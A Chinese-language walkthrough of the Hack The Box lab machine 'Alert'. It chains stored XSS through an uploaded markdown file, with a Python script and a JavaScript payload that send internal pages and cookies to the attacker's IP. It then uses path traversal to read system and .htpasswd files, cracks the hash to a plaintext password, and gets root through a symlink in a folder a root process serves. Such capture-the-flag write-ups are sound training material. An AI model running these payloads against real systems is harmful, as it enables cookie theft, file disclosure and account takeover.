HTB machine Alert workthrough:


step1:

在/etc/hosts 中添加
10.10.11.44 alert.htb
保证能够直接通过浏览器访问


step2：
访问alert.htb会发现可以上传一个markdown文件，服务器是对markdown有足够的校验的，如下(是ssh后才能读到源代码的，方便起见直接放出来)
index.php

route:  /index.php?page=alert
```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Alert - Markdown Viewer</title>
</head>
<body>
    <nav>
        <a href="index.php?page=alert">Markdown Viewer</a>
        <a href="index.php?page=contact">Contact Us</a>
        <a href="index.php?page=about">About Us</a>
        <a href="index.php?page=donate">Donate</a>
        <?php
        $ip = $_SERVER['REMOTE_ADDR'];
        if ($ip == '127.0.0.1' || $ip == '::1') {
            echo '<a href="index.php?page=messages">Messages</a>';
        }
        ?>
    </nav>
    <div class="container">
        <?php
        if (isset($_GET['page'])) {
            $page = $_GET['page'];

            switch ($page) {
                case 'alert':
    echo '<h1>Markdown Viewer</h1>';
    echo '<div class="form-container">
            <form action="visualizer.php" method="post" enctype="multipart/form-data">
                <input type="file" name="file" accept=".md" required>
                <input type="submit" value="View Markdown">
            </form>
          </div>';
                    break;
                case 'contact':
echo '<h1>Contact Us</h1>';
echo '<div class="form-container">' . htmlspecialchars($_GET['status']) .
      '  <form action="contact.php" method="post">
            <input type="email" name="email" placeholder="Your email" required>
            <textarea name="message" placeholder="Your message" rows="4" required></textarea>
            <input type="submit" value="Send">
        </form>
      </div>';

                    break;
                case 'about':
                    echo '<h1>About Us</h1>';
                    echo '<p>Hello! We are Alert. Our service gives you the ability to view MarkDown. We are reliable, secure, fast and easy to use. If you experience any problems with our service, please let us know. Our administrator is in charge of reviewing contact messages and reporting errors to us, so we strive to resolve all issues within 24 hours. Thank you for using our service!</p>';
                    break;
                case 'messages':
                    require 'messages.php';
                    break;
                case 'donate':
                    echo '<h1>Support Us</h1>';
                    echo '<p>Your donation helps improve Markdown visualization, providing a better user experience for everyone.</p>';
                    echo '<div class="form-container">
                            <form action="#" method="post">
                                <input type="number" name="amount" placeholder="Enter amount" required>
                                <input type="submit" value="Donate">
                            </form>
                          </div>';
                    break;
                default:
                    echo '<h1>Error: Page not found</h1>';
                    break;
            }
        } else {
            header("Location: index.php?page=alert");
        }
        ?>
    </div>
    <footer>
        <p style="color: black;">© 2024 Alert. All rights reserved.</p>
    </footer>
</body>
</html>

```
但是测试发现markdown文件包含script则能够在自己的浏览器上触发xss
step3：
route:  /index.php?page=contact
服务器不是直接包含.md文件，就是读进来而已，并且限制了文件的后缀和文件名中只能有一些合法的字符，这防止了.md的目录遍历
实际上黑盒测试中about页面已经提示你后台有个bot会看你的message，一猜就知道是xss，可以先在本地`nc -lnvp 1337`,然后发送```<script>location="http://10.10.xx.xx:1337"```去测试
连通性，注意只能用你vpn主机的ip，不能用公共域名，否则收不到tcp连接，并且不需要填充后面的scrip标签，原因是你本地nc测试之后会发现后面的部分只是累赘，会被
html编码。

step4：
route:  /visualizer.php?link_share=xxxxxx, /index.php?page=contact
连通性测试完成后就想办法让admin去访问一个有xss的页面，为什么不直接在这里xss？因为这里html编码的问题，你自己去试试会发现payload极其难以调试，特
别是引号的闭合问题。实际上markdown文件是不会转义html标签的，其中就包括`<script>`,那么就可以通过重定向到markdown文件来xss，markdown会被编译之后返回回
来并且生成一个link_share=xxx的公共链接，让admin去访问这个链接就可以执行完整的一个js代码。
贴一个python脚本：
这个脚本用于触发xss，只要修改你的a.md文件就好


```python
#xss.py
import threading
import requests
from bs4 import BeautifulSoup
import subprocess
import urllib
url="http://alert.htb"
def send_mess(a):
    email="a@qq.com"
    mes=("<script>location='{}".format(a))
    print(mes)
    r=requests.post(url+"/contact.php",data={"email":email,"message":mes},allow_redirects=False)
    print(r.status_code)
    print(r.text)
with open("a.md","rb") as f:
    res=requests.post(url+"/visualizer.php",files={"file":f}
    )
print(res.text)    
soup=BeautifulSoup(res.text,"html.parser")
a=soup.find_all("a",href=True)[0]["href"]
print(a)
send_mess(a)

```

```html
a.md
<script>
  var readfile="http://alert.htb/index.php?page=messages";//改一下page就好
  fetch(readfile)
    .then(response => response.text())
    .then(data => {     
      fetch("http://10.10.16.15:1337/?data=" + encodeURIComponent(data)+"&cookie="+document.cookie);//改成你的ip,靶机可以直接和你的主机通信
    })
    .catch(error => fetch("http://10.10.16.15:1337/?err="+error.message));
</script>

```


一个用于接受admin的请求的python 服务器:(用nc也可以)
```python
#server.py
from flask import Flask, send_from_directory, abort,request


app = Flask(__name__)

@app.route('/')
def serve_file():
    print(request.args.get('data'))
    return '200';

# 运行应用
if __name__ == '__main__':
    app.run(host='0.0.0.0',port=1337,debug=True)
```




用法：先python server.py,然后python xss.py即可（修改 a.md）
step5:


有上面的想法后，先去尝试看看admin眼中的/index.php，你就会发现有个`<a href="index.php?page=messages">Messages</a>`,暴露了一个文件出来，然后再让admin去访问这个page，就会发现messages.php接受一个file=xxxx参数，并且利用file这个参数可以读取任意文件，比如/etc/passwd,看看构造的js代码：

```html
<script>
  var readfile="http://alert.htb/messages.php?file=../../../../etc/passwd";
  fetch(readfile)
    .then(response => response.text())
    .then(data => {     
      fetch("http://10.10.16.15:1337/?data=" + encodeURIComponent(data)+"&cookie="+document.cookie);//改成你的ip,靶机可以直接和你的主机通信
    })
    .catch(error => fetch("http://10.10.16.15:1337/?err="+error.message));
</script>

```

step6:
读取/etc/hosts，发现还有个域名statistics.alert.htb，读取/etc/apache2/sites-available/000-default.conf (apache默认配置文件)发现这个域名要密码，
并且密码位于.htpasswd，根目录在/var/www/statistics.alert.htb，那么再读取.htpasswd:   albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
etc/passwd中其实有albert这个用户，并且可以ssh
尝试用hashcat破解密码：./hashcat.exe  -m 1600 -a 0 apachehash.txt rockyou.txt   (在仓库中放着)
得到$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited

step7：
ssh albert@10.10.11.44 输入密码，ls 发现user.txt，读取user flag

step8：
直接读不了rootflag
ps aux | grep root
发现root运行着php的web-monitor，在127.0.0.1:8080,进入/opt/website-monitor/monitors（只有它可写）
运行 
touch rootflag.txt
ln -sf /root/root.txt
因为phpmonitor是root运行的，你访问http://127.0.0.1:8080/monitors/rootflag.txt就会由具有root权限的进程去读取软链接的文件，这样就绕过权限读取了root.txt
